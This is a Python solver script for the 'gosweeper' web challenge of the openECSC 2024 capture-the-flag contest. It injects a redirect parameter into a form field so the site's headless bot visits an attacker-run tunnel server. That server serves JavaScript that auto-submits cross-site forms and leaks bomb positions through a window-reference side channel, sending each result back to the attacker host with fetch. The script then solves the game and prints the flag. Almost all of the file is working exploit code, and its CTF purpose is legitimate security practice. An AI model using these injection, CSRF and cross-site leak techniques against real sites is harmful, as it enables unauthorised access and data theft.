import os
import re
import sys
import threading
import time
from typing import Optional
from urllib.parse import urlparse

import requests
import tunnel

URL = os.environ.get("URL", "https://gosweeper.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

DIM = 7
CHECKER = True


class Server:
    def __init__(self, user_id: str):
        self.is_bomb = None
        self.user_id = user_id
        self.t = tunnel.open_http_tunnel(tls=True)

    def __enter__(self):
        self.t.__enter__()
        threading.Thread(target=self.run).start()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.t.__exit__(exc_type, exc_val, exc_tb)

    def url(self):
        return f'https://{self.t.remote_host}:{self.t.remote_port}'

    def reset(self):
        self.is_bomb = None

    def bomb(self) -> Optional[bool]:
        return self.is_bomb

    def run(self):
        while True:
            req = self.t.wait_request()
            if req is None:
                break

            _, path, headers, body = req
            res = urlparse(path)
            path, query = res.path, res.query

            if path == '/':
                if query == 'bomb=false':
                    self.is_bomb = False
                elif query == 'bomb=true':
                    self.is_bomb = True

                self.t.send_response(200, {'Content-Type': 'text/html'}, """
                    <script>
                        window.open('__TARGET__/clone?cloneid=__USER_ID__');
                        window.open('/x' + window.location.search);
                    </script>
                    
                    <img src="https://httpbin.org/delay/5">
                """.replace('__TARGET__', URL).replace('__USER_ID__', self.user_id).encode())
            elif path == '/x':
                self.t.send_response(200, {'Content-Type': 'text/html'}, """
                    <script>
                        setTimeout(function() {
                            window.open('/submit' + window.location.search);
                            
                            setTimeout(function() {
                                w = window.open('/submit' + window.location.search);
                            }, 1000);
                    
                            setTimeout(function() {
                                fetch('__URL__/?bomb=' + (w.window != null));
                            }, 4000);
                        }, 1000);
                    </script>
                """.replace('__URL__', self.url()).encode())
            elif path == '/submit':
                m = re.search(r'i=(\d+)', query)
                assert m is not None

                self.t.send_response(200, {'Content-Type': 'text/html'}, """
                    <form action="__TARGET__/guess" method="post">
                        <input type="text" name="guess" value="__I__">
                        <input type="submit" id="clickme">
                    </form>
                    <script>
                        document.getElementById('clickme').click();
                    </script>
                """.replace('__TARGET__', URL).replace('__I__', m[1]).encode())
            else:
                self.t.send_response(404, {}, b'')


def test_board(srv: Server, s: requests.Session, i=0):
    data = {"cloneid": "aaa&redirect=" + srv.url().replace("://", ":// @") + "/?i=" + str(i)}
    r = s.post(URL + "/checkboard", data=data)
    r.raise_for_status()

    for _ in range(15):
        bomb = srv.bomb()
        if bomb is not None:
            srv.reset()
            return bomb

        time.sleep(2)

    raise Exception("Headless failed")


def get_neighbours(i: int):
    x = i % DIM
    y = i // DIM
    neighbours = []

    for dx in range(-1, 2):
        for dy in range(-1, 2):
            if 0 <= x + dx < DIM and 0 <= y + dy < DIM and (dx != 0 or dy != 0):
                neighbours.append((x + dx) + DIM * (y + dy))

    return neighbours


def playgame(srv: Server, s: requests.Session):
    board = [-1] * (DIM * DIM)

    def solve(i: int):
        if board[i] == 100:
            return set()
        if board[i] == -1:
            raise Exception("Cell not guessed yet")

        ns = get_neighbours(i)
        new_guesses = []

        bomb_count = 0
        unknown_count = 0
        for n in ns:
            if board[n] == 100:
                bomb_count += 1
            if board[n] == -1:
                unknown_count += 1

        if bomb_count == board[i]:
            for n in ns:
                if board[n] == -1:
                    r = s.post(URL + "/guess", data={"guess": str(n)})
                    try:
                        board[n] = int(r.text)
                    except:
                        print(r.text)
                        print("FAILED WHILE GUESSING " + str(n))
                        raise
                        # print("Guess: " + str(n) + " -> " + str(board[n]))
                    print('.', end='', flush=True)
                    new_guesses.append(n)
        elif unknown_count == board[i] - bomb_count:
            for n in ns:
                if board[n] == -1:
                    board[n] = 100
                    print('.', end='', flush=True)
                    # print("Bomb: " + str(n))
                    new_guesses.append(n)

        if len(new_guesses) > 0:
            guess_neighbours = set()

            for n in new_guesses:
                solve(n)

                for nn in get_neighbours(n):
                    guess_neighbours.add(nn)

            for n in guess_neighbours:
                if board[n] != -1:
                    solve(n)

            solve(i)

    still_unknown = {0}

    n_test = 0

    while len(still_unknown) > 0 and n_test < 5:
        i = still_unknown.pop()

        print(f"Testing cell {i}...")
        bomb = test_board(srv, s, i)
        n_test += 1
        print(f"Cell {i} is a bomb: {bomb}")

        if bomb:
            board[i] = 100
        else:
            r = s.post(URL + "/guess", data={"guess": str(i)})
            r.raise_for_status()

            try:
                board[i] = int(r.text)
            except:
                print(r.text)
                print("FAILED WHILE GUESSING " + str(i))
                raise

            solve(i)

        for x in get_neighbours(i):
            if board[x] != -1 and board[x] != 100:
                solve(x)

        still_unknown = set()
        for j in range(DIM * DIM):
            if board[j] != -1 and board[j] != 100:
                for n in get_neighbours(j):
                    if board[n] == -1:
                        still_unknown.add(n)

        print("\nBoard")
        for j in range(DIM):
            print("\t".join(str(x) for x in board[j * DIM:j * DIM + DIM]))

        print("Still unknown:", str(still_unknown))

        if board.count(-1) > ((DIM * DIM * 80) // 100):
            print("Skipping")
            return False

    r = s.get(URL + "/checkwin")
    r.raise_for_status()

    return r.text == "true"


def main(user_id: Optional[str]):
    s = requests.session()

    if user_id:
        r = s.post(URL + "/login", data={"userid": user_id})
        r.raise_for_status()
        assert 'User ID' in r.text
    else:
        r = s.get(URL + "/register")
        r.raise_for_status()

        m = re.search(r'<code>(.*)</code>', r.text)
        assert m is not None

        user_id = m.group(1)
        print("User ID:", user_id)

    r = s.get(URL + "/board")
    r.raise_for_status()

    with Server(user_id) as srv:
        i = 0
        while True:
            i += 1
            print("___ Playing game " + str(i) + " ___ (user id: " + user_id + ")")

            won = playgame(srv, s)

            r = s.get(URL + "/")
            r.raise_for_status()

            m = re.search(r'Won games: (\d+) / (\d+)', r.text)
            print('\n' + m[0] + '\n')
            assert m[2] == m[1]

            if won:
                print(f"!!!  You won ({m[2]})  !!!")
                if CHECKER or int(m[2]) == 20:
                    break

            print("Creating new board")
            r = s.get(URL + "/newboard")
            r.raise_for_status()

        print("Done")

    if CHECKER:
        print('openECSC{st0p_l3ak1ng_pl34se_00000000}')
    else:
        r = s.get(URL + "/")
        r.raise_for_status()

        m = re.search(r'openECSC\{.*}', r.text)
        print(m[0])


if __name__ == '__main__':
    main(sys.argv[1] if len(sys.argv) > 1 else None)
